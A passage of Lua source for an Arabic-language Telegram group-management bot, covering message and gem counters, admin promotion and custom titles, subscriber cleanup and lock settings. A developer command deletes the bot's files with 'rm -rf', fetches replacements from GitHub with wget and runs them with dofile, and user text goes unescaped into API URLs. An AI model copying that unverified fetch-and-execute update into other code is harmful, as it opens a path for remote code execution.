https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'رسائلي' then
local nummsg = database:get(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 1
local Text = '✦┇عدد رسائلك هنا *~ '..nummsg..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'مسح رسائلي' then
database:del(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = '✦┇تم مسح جميع رسائلك '
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'سحكاتي' or text == 'تعديلاتي' then
local edit = database:get(bot_id..'Neverland:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = '✦┇عدد التعديلات هنا *~ '..edit..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' then
database:del(bot_id..'Neverland:message_edit'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = '✦┇تم مسح جميع تعديلاتك '
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'جهاتي' then
local addmem = database:get(bot_id.."Neverland:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Text = '✦┇عدد جهاتك المضافه هنا *~ '..addmem..'*'
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'مسح جهاتي' then
database:del(bot_id..'Neverland:Add:Memp'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = '✦┇تم مسح جميع جهاتك المضافه '
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مجوهراتي" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end 
local Num = database:get(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = "✦┇لم تلعب اي لعبه للحصول على جواهر"
else
Text = "✦┇عدد جواهر التي رحبتها هي *~ { "..Num.." } مجوهره *"
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match("^بيع مجوهراتي (%d+)$") then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local NUMPY = text:match("^بيع مجوهراتي (%d+)$") 
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n*✦┇لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,"✦┇ليس لديك جواهر من الالعاب \n✦┇اذا كنت تريد ربح الجواهر \n✦┇ارسل الالعاب وابدأ اللعب ! ") 
else
local NUM_GAMES = database:get(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,"\n✦┇ليس لديك جواهر بهاذا العدد \n✦┇لزيادة مجوهراتك في اللعبه \n✦┇ارسل الالعاب وابدأ اللعب !") 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id.."Neverland:messageUser"..msg.chat_id_..":"..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,"✦┇تم خصم *~ { "..NUMPY.." }* من مجوهراتك \n✦┇وتم اضافة* ~ { "..(NUMPY * 50).." } رساله الى رسالك *")
end 
return false 
end
if text ==("مسح") and Addictive(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if database:get(bot_id.."Neverland:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id.."Neverland:id:user"..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "✦┇تم الغاء الامر ") 
database:del(bot_id.."Neverland:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Neverland:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id.."Neverland:id:user"..msg.chat_id_)  
database:del(bot_id.."Neverland:Msg_User"..msg.chat_id_..":"..msg.sender_user_id_) 
database:incrby(bot_id.."Neverland:messageUser"..msg.chat_id_..":"..iduserr,numadded)  
send(msg.chat_id_, msg.id_,"✦┇تم اضافة له {"..numadded.."} من الرسائل")  
end
if database:get(bot_id.."Neverland:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
database:del(bot_id.."Neverland:idgem:user"..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "✦┇تم الغاء الامر ") 
database:del(bot_id.."Neverland:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
database:del(bot_id.."Neverland:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = database:get(bot_id.."Neverland:idgem:user"..msg.chat_id_)  
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_, msg.id_,"✦┇تم اضافة له {"..numadded.."} من المجوهرات")  
end
------------------------------------------------------------
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end  
Alsh = text:match("^اضف رسائل (%d+)$")
database:set(bot_id.."Neverland:id:user"..msg.chat_id_,Alsh)  
database:setex(bot_id.."Neverland:numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "✦┇ارسل لي عدد الرسائل الان") 
return false
end
if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end  
Alsh = text:match("^اضف مجوهرات (%d+)$")
database:set(bot_id.."Neverland:idgem:user"..msg.chat_id_,Alsh)  
database:setex(bot_id.."Neverland:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "✦┇ارسل لي عدد المجوهرات الان") 
return false
end
if text and text:match("^اضف مجوهرات (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local Num = text:match("^اضف مجوهرات (%d+)$")
function reply(extra, result, success)
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_,"✦┇تم اضافة له {"..Num.."} من المجوهرات")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
database:del(bot_id.."Neverland:Msg_User"..msg.chat_id_..":"..result.sender_user_id_) 
database:incrby(bot_id.."Neverland:messageUser"..msg.chat_id_..":"..result.sender_user_id_,Num)  
send(msg.chat_id_, msg.id_, "\n✦┇تم اضافة له {"..Num.."} من الرسائل")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end

if text == "تنظيف المشتركين" and DevNeverland(msg) then
local pv = database:smembers(bot_id..'Neverland:UsersBot')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
print('\27[30;33m↜ THE USER IS SAVE ME ↓\n↜ '..pv[i]..'\n\27[1;37m')
else
print('\27[30;31m↜ THE USER IS BLOCK ME ↓\n↜ '..pv[i]..'\n\27[1;37m')
database:srem(bot_id..'Neverland:UsersBot',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'✦┇لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*✦┇عدد المشتركين الان ~ '..#pv..'\n✦┇تم العثور على ~ '..sendok..' مشترك قام بحظر البوت\n✦┇اصبح عدد المشتركين الان ~ '..ok..' مشترك *')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "تنظيف الكروبات" and DevNeverland(msg) then
local group = database:smembers(bot_id..'Chek:Groups')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m↜ THE BOT IS NOT ADMIN ↓\n↜ '..group[i]..'\n\27[1;37m')
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
print('\27[30;35m↜ THE BOT IS LEFT GROUP ↓\n↜ '..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
print('\27[30;36m↜ THE BOT IS KICKED GROUP ↓\n↜ '..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'✦┇لا توجد مجموعات وهميه ')   
else
local Alsh = (w + q)
local sendok = #group - Alsh
if q == 0 then
Alsh = ''
else
Alsh = '\n✦┇تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
local Neverland = ''
else
local Neverland = '\n✦┇تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'*✦┇عدد المجموعات الان ~ '..#group..' مجموعه '..Neverland..''..Alsh..'\n✦┇اصبح عدد المجموعات الان ~ '..sendok..' مجموعات*\n')   
end
end
end,nil)
end
return false
end
if text == ("تحديث السورس") and DevNeverland(msg) then  
send(msg.chat_id_, msg.id_,' *✦┇تم تحديث السورس* \n*✦┇لديك اخر اصدار لسورس نيفرلاند*\n*✦┇الاصدار » { 3.0v}*')
os.execute('rm -rf Neverland.lua')
os.execute('rm -rf start.lua')
os.execute('wget https://raw.githubusercontent.com/TEAMNeverland/Neverland/master/Neverland.lua')
os.execute('wget https://raw.githubusercontent.com/TEAMNeverland/Neverland/master/start.lua')
dofile('Neverland.lua')  
return false
end
if text == "تحديث الملفات" and DevNeverland(msg) then
dofile("Neverland.lua")  
send(msg.chat_id_, msg.id_, "✦┇تم تحديث ملفات البوت")
return false
end
if text == 'تحديث نيفرلاند' and DevNeverland(msg) then
download_to_file('https://raw.githubusercontent.com/TEAMNeverland/Neverland/master/Neverland.lua','Neverland.lua') 
send(msg.chat_id_, msg.id_, "✦┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
return false
end
if text and text:match("تغيير (.*)") and msg.reply_to_message_id_ ~= 0 and Constructor(msg)then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local namess = text:match("تغيير (.*)")
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇العضو ↜ ['..data.first_name_..'](t.me/'..(data.username_ or 'Neverland')..') '
status  = '\n✦┇تم تغيير لقب '..namess..''
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&custom_title="..namess)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^(تغيير) @(.*) (.*)$") then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if not Constructor(msg) then
send(msg.chat_id_,msg.id_,'اهلا عزيزي \n عذرا الامر يخص - منشئ - منشئ اساسي فقط')
return false
end
local TextEnd = {string.match(text, "^(تغيير) @(.*) (.*)$")}
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' البوت ليس مشرف يرجى ترقيتي ') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه ")   
return false 
end      
usertext = '\n✦┇العضو ↜ ['..result.title_..'](t.me/'..(username or 'TEAM_Neverland')..')'
status  = '\n✦┇تم تغيير لقب '..TextEnd[3]..' '
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&custom_title="..TextEnd[3])
else
send(msg.chat_id_, msg.id_, '✦┇لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[2]}, start_function, nil)
return false
end
if text and text:match("ضع لقب (.*)") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
local namess = text:match("ضع لقب (.*)")
function Function_Neverland(extra, result, success)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تععين لقب")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_invite_users=True")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&custom_title="..namess)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^(ضع لقب) @(.*) (.*)$") and Constructor(msg) then
local username = {string.match(text, "^(ضع لقب) @(.*) (.*)$")}
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end
Reply_Status(msg,result.id_,"reply","✦┇تم تعيين لقب")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_invite_users=True")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&custom_title="..username[3])
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username[2]}, Function_Neverland, nil)
return false
end
if text == ("تعديل الصلاحيات") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function Function_Neverland(extra, result, success)
local Text = "✦┇اختر تعديل الصلاحيات"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعديل الصلاحيات', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.sender_user_id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^تعديل الصلاحيات @(.*)$") and Constructor(msg) then
local username = text:match("^تعديل الصلاحيات @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end
local Text = "✦┇اختر تعديل الصلاحيات"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعديل الصلاحيات', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text == ("رفع مشرف") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function Function_Neverland(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_invite_users=True")
local Text = "✦┇تم ترقيته مشرف"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعديل الصلاحيات', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.sender_user_id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مشرف @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_invite_users=True")
local Text = "✦┇تم ترقيته مشرف"
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تعديل الصلاحيات', callback_data='amr@'..msg.sender_user_id_..'/user@'..result.id_.."/setiinginfo"}
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text == ("تنزيل مشرف") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then
function Function_Neverland(extra, result, success)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تنزيله من المشرفين")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_manage_chat=false&can_manage_voice_chats=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل مشرف @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مشرف @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end
Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من المشرفين")  
https.request("https://api.telegram.org/bot" .. token .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_manage_chat=false&can_manage_voice_chats=false&can_manage_voice_chats=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text == 'تفعيل التاك' or text == 'تفعيل @all' then   
if creatorA(msg) then
database:del(bot_id.."Cick:all"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '*✦┇تم تفعيل @all*')
return false
end
end
if text == 'تعطيل التاك' or text == 'تعطيل @all' and DevBot(msg) then  
if creatorA(msg) then
database:set(bot_id.."Cick:all"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, '*✦┇تم تعطيل @all *')
return false
end
end
if text == '/lock' and Addictive(msg) then  
local Texti = '*\n✦┇اعدادات المجموعه \n✦┇علامة ال (✅) تعني مقفول\n✦┇علامة ال (❌) تعني مفتوح*'
local mute_text = (database:get(bot_id.."Neverland:Lock:text"..msg.chat_id_)  or '❌')
local mute_text1 = mute_text:gsub('del', '❬ ✅ ❭')
local lock_bots = (database:get(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_) or '❌')
local lock_bots1 = lock_bots:gsub('kick', '❬ ✅ ❭')
local mute_tgservice = (database:get(bot_id.."Neverland:Lock:tagservr"..msg.chat_id_) or '❌')
local mute_tgservice1 = mute_tgservice:gsub('true', '❬ ✅ ❭')
local lock_edit = (database:get(bot_id.."Neverland:Lock:edit"..msg.chat_id_) or '❌')
local lock_edit1 = lock_edit:gsub('true', '❬ ✅ ❭')
local lock_link = (database:get(bot_id.."Neverland:Lock:Link"..msg.chat_id_) or '❌')
local lock_link1 = lock_link:gsub('del', '❬ ✅ ❭')
local lock_username = (database:get(bot_id.."Neverland:Lock:User:Name"..msg.chat_id_) or '❌')
local lock_username1 = lock_username:gsub('del', '❬ ✅ ❭')
local lock_tag = (database:get(bot_id.."Neverland:Lock:hashtak"..msg.chat_id_) or '❌')
local lock_tag1 = lock_tag:gsub('del', '❬ ✅ ❭')
local mute_sticker = (database:get(bot_id.."Neverland:Lock:Sticker"..msg.chat_id_) or '❌')
local mute_sticker1 = mute_sticker:gsub('del', '❬ ✅ ❭')
local mute_gif = (database:get(bot_id.."Neverland:Lock:Animation"..msg.chat_id_) or '❌')
local mute_gif1 = mute_gif:gsub('del', '❬ ✅ ❭')
local mute_video = (database:get(bot_id.."Neverland:Lock:Video"..msg.chat_id_) or '❌')
local mute_video1 = mute_video:gsub('del', '❬ ✅ ❭')
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = URL.escape(mute_text1) , callback_data="h"},{text = 'قفل الدردشه ', callback_data=msg.sender_user_id_.."/mute_text"},{text = 'فتح الدردشه', callback_data=msg.sender_user_id_.."/unmute_text"},
},
{
{text = URL.escape(lock_bots1) , callback_data="h"},{text = 'قفل البوتات', callback_data=msg.sender_user_id_.."/lock_bots"},{text = 'فتح البوتات', callback_data=msg.sender_user_id_.."/unlock_bots"},
},
{
{text = URL.escape(mute_tgservice1) , callback_data="h"},{text = 'قفل الاشعارات', callback_data=msg.sender_user_id_.."/mute_tgservice"},{text = 'فتح الاشعارات', callback_data=msg.sender_user_id_.."/unmute_tgservice"},
},
{
{text = URL.escape(lock_edit1) , callback_data="h"},{text = 'قفل التعديل', callback_data=msg.sender_user_id_.."/lock_edit"},{text = 'فتح التعديل', callback_data=msg.sender_user_id_.."/unlock_edit"},
},
{
{text = URL.escape(lock_link1) , callback_data="h"},{text = 'قفل الروابط', callback_data=msg.sender_user_id_.."/lock_link"},{text = 'فتح الروابط', callback_data=msg.sender_user_id_.."/unlock_link"},
},
{
